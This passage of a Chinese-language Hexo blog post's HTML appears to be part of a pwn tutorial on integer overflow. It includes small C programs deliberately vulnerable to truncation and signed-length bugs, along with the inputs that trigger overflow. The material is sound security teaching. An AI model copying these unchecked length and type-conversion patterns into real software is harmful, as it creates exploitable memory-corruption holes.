class="line">asdfasfasdfasdfafasfasfasdfasdf</span><br><span class="line"><span class="comment"># gdb a.out</span></span><br><span class="line">► 0x40066d &lt;main+71&gt;    call   malloc@plt &lt;0x400500&gt;</span><br><span class="line">        size: 0xf</span><br></pre></td></tr></table></figure>
+<p>只申请 0x20 大小的堆，但是却能输入 0xffffffff 长度的数据，从整型溢出到堆溢出</p>
+<h4 id="错误的类型转换">错误的类型转换</h4>
+<p>即使正确的对变量进行约束，也仍然有可能出现整数溢出漏洞，有以下两种情况。</p>
+<ol type="1">
+<li>范围大的变量赋值给范围小的变量</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> test2.c</span><br><span class="line">void check(int n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!n)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    long int a;</span><br><span class="line"></span><br><span class="line">    scanf(<span class="string">&quot;%ld&quot;</span>, &amp;a);</span><br><span class="line">    <span class="keyword">if</span> (a == 0)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bad&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        check(a);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc test2.c</span><br><span class="line">$ ./a.out</span><br><span class="line">4294967296</span><br><span class="line">vuln</span><br></pre></td></tr></table></figure>
+<p>上述代码就是一个范围大的变量 (长整型 a)，传入 check 函数后变为范围小的变量 (整型变量 n)，造成整数溢出的例子。</p>
+<p>已经长整型的占有 8 byte 的内存空间，而整型只有 4 byte 的内存空间，所以当 long -&gt; int，将会造成截断，只把长整型的低 4byte 的值传给整型变量。</p>
+<p>在上述例子中，就是把 long: 0x100000000 -&gt; int: 0x00000000。</p>
+<p>但是当范围更小的变量就能完全的把值传递给范围更大的变量，而不会造成数据丢失。</p>
+<ol start="2" type="1">
+<li>只做了单边限制</li>
+</ol>
+<p>这种情况只针对有符号类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> test3.c</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int len, l;</span><br><span class="line">    char buf[11];</span><br><span class="line"></span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; 10) &#123;</span><br><span class="line">        l = <span class="built_in">read</span>(0, buf, len);</span><br><span class="line">        *(buf+l) = 0;</span><br><span class="line">        puts(buf);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please len &lt; 10&quot;</span>);        </span><br><span class="line">&#125;</span><br><span class="line">$ gcc test3.c</span><br><span class="line">$ ./a.out</span><br><span class="line">-1</span><br><span class="line">aaaaaaaaaaaa</span><br><span class="line">aaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+<p>从表面上看，我们对变量 len 进行了限制，但是仔细思考可以发现，len 是有符号整型，所以 len 的长度可以为负数，但是在 read 函数中，第三个参数的类型是 size_t，该类型相当于 unsigned long int，属于无符号长整型。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/share/" rel="tag"># share</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/09/13/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" rel="prev" title="逆向工程">
+      <i class="fa fa-chevron-left"></i> 逆向工程
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">基础知识准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">2.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">栈结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88"><span class="nav-number">2.2.</span> <span class="nav-text">函数调用栈</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E5%88%86%E9%85%8D"><span class="nav-number">2.2.1.</span> <span class="nav-text">寄存器分配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-number">2.2.2.</span> <span class="nav-text">栈帧结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="nav-number">2.2.3.</span> <span class="nav-text">堆栈操作</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="nav-number">2.3.</span> <span class="nav-text">栈溢出原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.3.1.</span> <span class="nav-text">示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.3.2.</span> <span class="nav-text">栈溢出步骤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">2.4.</span> <span class="nav-text">例题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-number">3.</span> <span class="nav-text">整数溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#c%E8%AF%AD%E8%A8%80%E6%95%B4%E6%95%B0%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.1.</span> <span class="nav-text">C语言整数类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86"><span class="nav-number">3.2.</span> <span class="nav-text">溢出原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="nav-number">3.2.1.</span> <span class="nav-text">上界溢出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E7%95%8C%E6%BA%A2%E5%87%BA"><span class="nav-number">3.2.2.</span> <span class="nav-text">下界溢出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="nav-number">3.3.</span> <span class="nav-text">示例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E9%99%90%E5%88%B6%E8%8C%83%E5%9B%B4"><span class="nav-number">3.3.1.</span> <span class="nav-text">未限制范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="nav-number">3.3.2.</span> <span class="nav-text">错误的类型转换</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lylanfree"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">lylanfree</p>
+  <div class="site-description" itemprop="description">持续学习的程序员</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lylanfree</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">109k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">1:39</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('post.copy_button').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+          if(result)$(this).text('post.copy_success')
+          else $(this).text('post.copy_failure')
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('post.copy_button')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
